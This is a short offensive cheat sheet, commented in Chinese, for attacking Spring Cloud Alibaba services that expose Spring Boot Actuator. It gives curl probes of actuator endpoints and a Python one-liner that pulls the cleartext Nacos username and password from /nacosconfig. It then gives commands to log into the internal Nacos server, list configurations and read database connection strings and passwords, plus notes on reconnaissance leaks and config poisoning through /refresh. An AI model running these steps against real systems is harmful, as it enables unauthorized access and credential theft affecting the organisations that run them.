# 检测（无需 token）
for e in "" /nacosconfig /nacosdiscovery /env /configprops /health; do
  echo "== $e"
  curl -sk -o /tmp/a -w "%{http_code} %{size_download}\n" "https://TARGET/api/actuator$e"
  head -c 600 /tmp/a; echo
done

# 关键判据
# 1) /api/actuator 返回 _links 且含 nacosconfig / nacosdiscovery → Spring Cloud Alibaba + Actuator 暴露
# 2) /api/actuator/nacosconfig 直接序列化 NacosConfigProperties POJO，
#    该端点【不经过】Spring 的 Sanitizer，因此 username/password 为明文，
#    即使 management.endpoint.env.show-values=never（env/configprops 全量 ******）也照漏。

# 提取凭据
curl -sk https://TARGET/api/actuator/nacosconfig | python3 -c '
import json,sys
d=json.load(sys.stdin)["NacosConfigProperties"]
print("server:",d["serverAddr"]); print("user:",d["username"]); print("pass:",d["password"])
print("ns:",d["namespace"],"group:",d["group"])
'

# 利用（需内网可达）
# 1) 登录取 accessToken
curl -s -X POST "http://NACOS:8848/nacos/v1/auth/login" -d "username=USER&password=PASS"
# 2) 列配置
curl -s "http://NACOS:8848/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=100&accessToken=TOKEN"
# 3) 读 datasource 配置（DB 连接串与口令通常在各服务的 application-*.yml / *-app.yml）
curl -s "http://NACOS:8848/nacos/v1/cs/configs?dataId=application-common.yml&group=DEFAULT_GROUP&accessToken=TOKEN"

# 其他可捡的东西
# /api/actuator/health  -> 列出全部注册服务名（discoveryClient.services）与各组件状态
# /api/actuator/configprops -> 即使 value 被掩码，仍泄露 security.ignore.whites[] 白名单条目数量、
#                              网关 routes[].id/uri 条目数量、配置文件来源名（DEFAULT_GROUP@xxx.yml）
# POST /api/actuator/refresh 若返回 [] 说明可执行（配合 Nacos 写权限可做到配置投毒）
# POST /api/actuator/env 返回 405 -> 写接口已关（Boot 3 默认），不必再试